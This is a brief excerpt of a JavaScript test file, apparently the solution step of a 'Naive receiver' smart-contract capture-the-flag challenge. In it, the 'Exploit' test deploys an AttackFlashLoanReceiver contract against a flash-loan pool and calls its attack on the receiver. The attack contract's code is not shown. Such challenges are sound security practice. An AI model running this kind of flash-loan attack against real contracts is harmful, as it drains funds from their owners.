...
describe('[Challenge] Naive receiver', function () {
  ...
  it('Exploit', async function () {
    ...
    */
    ...
    const AttackFlashLoanReceiverFactory = await ethers.getContractFactory(
      'AttackFlashLoanReceiver',
      attacker,
    );
    const attackFlashLoanReceiver = await AttackFlashLoanReceiverFactory.deploy(
      this.pool.address,
    );

    await attackFlashLoanReceiver.attack(this.receiver.address);
  });
